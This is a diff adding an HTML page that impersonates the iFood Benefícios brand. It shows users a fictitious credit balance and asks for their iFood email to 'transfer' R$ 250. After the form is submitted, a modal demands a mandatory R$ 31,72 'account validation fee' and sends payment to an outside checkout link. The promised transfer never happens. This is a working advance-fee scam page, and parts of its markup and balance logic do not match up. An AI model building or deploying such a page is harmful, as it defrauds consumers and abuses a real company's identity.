@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <!-- Favicons -->
+    <link rel="icon" href="../images/favicon.ico" sizes="any">
+    <link rel="icon" href="../images/favicon-16x16.png" type="image/png" sizes="16x16">
+    <link rel="icon" href="../images/favicon-32x32.png" type="image/png" sizes="32x32">
+    <link rel="apple-touch-icon" href="../images/apple-touch-icon.png">
+
+    <!-- Meta Tags -->
+    <title>Saldo no iFood - iFood Benefícios</title>
+    <meta name="description" content="Transforme seus créditos em saldo na sua conta do iFood">
+    <meta name="author" content="iFood Benefícios">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #f8f9fa;
+            min-height: 100vh;
+            padding-bottom: 100px;
+        }
+
+        .header {
+            background: white;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            height: 32px;
+            border-radius: 8px;
+        }
+
+        .balance {
+            background: #EB2834;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+            padding: 24px;
+        }
+
+        .page-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .page-subtitle {
+            font-size: 16px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .balance-display {
+            background: linear-gradient(135deg, #EB2834 0%, #d91e2a 100%);
+            color: white;
+            padding: 32px 24px;
+            border-radius: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .balance-label {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 8px;
+        }
+
+        .balance-amount {
+            font-size: 32px;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            background: #fafafa;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-input:focus {
+            border-color: #EB2834;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(235, 40, 52, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: #999;
+            font-weight: 400;
+        }
+
+        .fixed-amount {
+            background: #f8f9fa;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+        }
+
+        .amount-display {
+            font-size: 24px;
+            font-weight: 700;
+            color: #EB2834;
+        }
+
+        .withdraw-btn {
+            width: 100%;
+            padding: 16px;
+            background: #EB2834;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 16px;
+        }
+
+        .withdraw-btn:hover {
+            background: #d91e2a;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(235, 40, 52, 0.3);
+        }
+
+        .withdraw-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        .navigation {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            padding: 16px;
+            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.1);
+            z-index: 100;
+        }
+
+        .nav-items {
+            display: flex;
+            justify-content: space-around;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: #999;
+            transition: color 0.3s ease;
+        }
+
+        .nav-item.active {
+            color: #EB2834;
+        }
+
+        .nav-icon {
+            width: 40px;
+            height: 40px;
+            background: #f0f0f0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 4px;
+            font-size: 18px;
+            transition: all 0.3s ease;
+        }
+
+        .nav-item.active .nav-icon {
+            background: #EB2834;
+            color: white;
+        }
+
+        .nav-label {
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        /* Animações */
+        .card {
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        /* Modal de Taxa de Validação */
+        .validation-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .validation-modal {
+            background: white;
+            border-radius: 20px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            animation: modalSlideIn 0.3s ease-out;
+            overflow: hidden;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-30px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .modal-header {
+            position: relative;
+            padding: 20px 24px 0;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: #f0f0f0;
+            border: none;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 18px;
+            color: #666;
+            transition: all 0.3s ease;
+        }
+
+        .modal-close:hover {
+            background: #e0e0e0;
+            color: #333;
+        }
+
+        .modal-content {
+            padding: 24px;
+            text-align: center;
+        }
+
+        .modal-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+            display: block;
+        }
+
+        .modal-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .modal-message {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .modal-message p {
+            margin-bottom: 12px;
+        }
+
+        .modal-message strong {
+            color: #EB2834;
+            font-weight: 700;
+        }
+
+        .fee-amount {
+            background: #fef2f2;
+            border: 2px solid #EB2834;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+
+        .fee-label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 4px;
+        }
+
+        .fee-value {
+            font-size: 28px;
+            font-weight: 700;
+            color: #EB2834;
+        }
+
+        .modal-actions {
+            padding: 0 24px 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn-pay-fee {
+            width: 100%;
+            padding: 16px;
+            background: #EB2834;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-pay-fee:hover {
+            background: #d91e2a;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(235, 40, 52, 0.3);
+        }
+
+        .btn-cancel {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            color: #666;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-cancel:hover {
+            background: #f8f9fa;
+            border-color: #ccc;
+            color: #333;
+        }
+
+        /* Responsividade para mobile */
+        @media (max-width: 480px) {
+            .validation-modal {
+                margin: 0 16px;
+                border-radius: 16px;
+            }
+
+            .modal-title {
+                font-size: 20px;
+            }
+
+            .modal-message {
+                font-size: 15px;
+            }
+
+            .fee-value {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/IFood_logo.svg/1200px-IFood_logo.svg.png"
+            alt="iFood" class="logo">
+        <div class="balance" id="balance">R$ 100,00</div>
+    </div>
+
+    <!-- Container -->
+    <div class="container">
+        <div class="card">
+            <h1 class="page-title">Saldo no iFood</h1>
+            <p class="page-subtitle">Transforme seus créditos em saldo na sua conta do iFood</p>
+
+            <!-- Saldo disponível -->
+            <div class="balance-display">
+                <div class="balance-label">Saldo disponível</div>
+                <div class="balance-amount" id="available-balance">R$ 100,00</div>
+            </div>
+
+            <!-- Mensagens -->
+            <div class="success-message" id="success-message">
+                Transferência realizada com sucesso! Você receberá um cupom de R$ 250,00 no seu email cadastrado no
+                iFood.
+            </div>
+
+            <div class="error-message" id="error-message">
+                Erro ao transferir saldo. Verifique os dados e tente novamente.
+            </div>
+
+            <!-- Formulário de saque -->
+            <form id="withdraw-form">
+                <div class="form-group">
+                    <label class="form-label" for="amount">Valor a transferir</label>
+                    <div class="fixed-amount">
+                        <span class="amount-display">R$ 250,00</span>
+                        <input type="hidden" id="amount" name="amount" value="250.00">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="ifood-email">Email cadastrado no iFood</label>
+                    <input type="email" id="ifood-email" name="ifood-email" class="form-input"
+                        placeholder="seu-email@exemplo.com" required>
+                </div>
+
+                <button type="submit" class="withdraw-btn" id="withdraw-btn">
+                    Transferir
+                </button>
+            </form>
+
+            <p class="info-text">
+                • Valor fixo: R$ 250,00<br>
+                • Será enviado um cupom para seu email<br>
+                • Processamento: até 2 dias úteis
+            </p>
+        </div>
+    </div>
+
+    <!-- Modal de Taxa de Validação -->
+    <div class="validation-modal-overlay" id="validation-modal">
+        <div class="validation-modal">
+            <div class="validation-modal-header">
+                <button class="modal-close-btn" id="modal-close-btn">&times;</button>
+                <div class="modal-shield-icon">🛡️</div>
+                <h2 class="modal-title">Validação de Conta</h2>
+                <p class="modal-subtitle">Necessária para liberar seu saldo</p>
+            </div>
+            
+            <div class="validation-modal-body">
+                <div class="fee-highlight">
+                    <div class="fee-amount">R$ 31,72</div>
+                    <p class="fee-label">Taxa de Validação Obrigatória</p>
+                </div>
+                
+                <p class="modal-text">
+                    Para garantir a <strong>segurança da transferência</strong>, é necessário validar sua conta com uma taxa única de R$ 31,72.
+                </p>
+                
+                <p class="modal-text">
+                    Esta é uma etapa <strong>obrigatória</strong> para confirmar que a conta é real e pertence a você.
+                </p>
+                
+                <div class="modal-features">
+                    <h4>🔒 Por que é necessário?</h4>
+                    <ul>
+                        <li>Verificação de identidade obrigatória</li>
+                        <li>Proteção contra fraudes</li>
+                        <li>Validação de conta real do iFood</li>
+                        <li>Liberação imediata após pagamento</li>
+                    </ul>
+                </div>
+                
+                <p class="modal-text">
+                    <strong>Após o pagamento</strong>, seu saldo de R$ 250,00 será liberado imediatamente no seu app do iFood!
+                </p>
+            </div>
+            
+            <div class="validation-modal-footer">
+                <button class="pay-fee-btn" id="pay-fee-btn">
+                    🔓 Pagar Taxa e Liberar Saldo
+                </button>
+                <button class="cancel-btn" id="cancel-btn">
+                    Cancelar agora
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="navigation">
+        <div class="nav-items">
+            <a href="../saque/" class="nav-item active">
+                <div class="nav-icon">$</div>
+                <div class="nav-label">Saldo</div>
+            </a>
+            <a href="../dashboard/" class="nav-item">
+                <div class="nav-icon">🏠</div>
+                <div class="nav-label">Avaliar</div>
+            </a>
+            <a href="../faq/" class="nav-item">
+                <div class="nav-icon">?</div>
+                <div class="nav-label">Dúvidas</div>
+            </a>
+        </div>
+    </div>
+
+    <script>
+        let currentBalance = 100; // Saldo inicial
+
+        // Carregar saldo salvo
+        const savedBalance = localStorage.getItem('currentBalance');
+        if (savedBalance) {
+            currentBalance = parseFloat(savedBalance);
+        }
+
+        // Atualizar interface com saldo atual
+        function updateBalance() {
+            document.getElementById('balance').textContent = `R$ ${currentBalance.toFixed(2)}`;
+            document.getElementById('available-balance').textContent = `R$ ${currentBalance.toFixed(2)}`;
+        }
+
+        // Classe para gerenciar o modal de validação
+        class ValidationModal {
+            constructor() {
+                this.modal = document.getElementById('validation-modal');
+                this.isOpen = false;
+                this.setupEventListeners();
+            }
+
+            setupEventListeners() {
+                // Botão de fechar (X)
+                document.getElementById('modal-close-btn').addEventListener('click', () => {
+                    this.hide();
+                });
+
+                // Botão Cancelar
+                document.getElementById('cancel-btn').addEventListener('click', () => {
+                    this.hide();
+                });
+
+                // Botão Pagar Taxa
+                document.getElementById('pay-fee-btn').addEventListener('click', () => {
+                    this.handlePayment();
+                });
+
+                // Fechar ao clicar fora do modal
+                this.modal.addEventListener('click', (e) => {
+                    if (e.target === this.modal) {
+                        this.hide();
+                    }
+                });
+
+                // Fechar com ESC
+                document.addEventListener('keydown', (e) => {
+                    if (e.key === 'Escape' && this.isOpen) {
+                        this.hide();
+                    }
+                });
+            }
+
+            show() {
+                this.modal.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
+                this.isOpen = true;
+            }
+
+            hide() {
+                this.modal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+                this.isOpen = false;
+            }
+
+            handlePayment() {
+                // Redirecionar para checkout externo
+                window.open('https://go.cinqpay.com.br/lcqxod8baj', '_blank');
+                this.hide();
+            }
+        }
+
+        // Instanciar modal de validação
+        const validationModal = new ValidationModal();
+
+        // Inicializar
+        document.addEventListener('DOMContentLoaded', function () {
+            updateBalance();
+
+            // Event listener para o formulário
+            document.getElementById('withdraw-form').addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                const amount = 250.00; // Valor fixo
+                const ifoodEmail = document.getElementById('ifood-email').value.trim();
+
+                // Validações
+                if (amount > currentBalance) {
+                    showError('Saldo insuficiente para esta transferência');
+                    return;
+                }
+
+                if (!ifoodEmail) {
+                    showError('Por favor, insira seu email cadastrado no iFood');
+                    return;
+                }
+
+                // Validação de email
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(ifoodEmail)) {
+                    showError('Por favor, insira um email válido');
+                    return;
+                }
+
+                // MOSTRAR MODAL DE TAXA DE VALIDAÇÃO em vez de processar diretamente
+                validationModal.show();
+            });
+        });
+
+        function processWithdraw(amount, email) {
+            const btn = document.getElementById('withdraw-btn');
+            btn.textContent = 'Processando...';
+            btn.disabled = true;
+
+            // Simular processamento
+            setTimeout(() => {
+                // Atualizar saldo
+                currentBalance -= amount;
+                localStorage.setItem('currentBalance', currentBalance.toString());
+                updateBalance();
+
+                // Mostrar sucesso
+                showSuccess();
+
+                // Limpar formulário
+                document.getElementById('withdraw-form').reset();
+
+                // Restaurar botão
+                btn.textContent = 'Transferir';
+                btn.disabled = false;
+
+                // Log para debug (opcional)
+                console.log(`Transferência processada: R$ ${amount.toFixed(2)} para ${email}`);
+
+            }, 2000);
+        }
+
+        function showSuccess() {
+            document.getElementById('success-message').style.display = 'block';
+            document.getElementById('error-message').style.display = 'none';
+
+            setTimeout(() => {
+                document.getElementById('success-message').style.display = 'none';
+            }, 5000);
+        }
+
+        function showError(message) {
+            document.getElementById('error-message').textContent = message;
+            document.getElementById('error-message').style.display = 'block';
+            document.getElementById('success-message').style.display = 'none';
+
+            setTimeout(() => {
+                document.getElementById('error-message').style.display = 'none';
+            }, 5000);
+        }
+    </script>
+</body>
+
+</html>
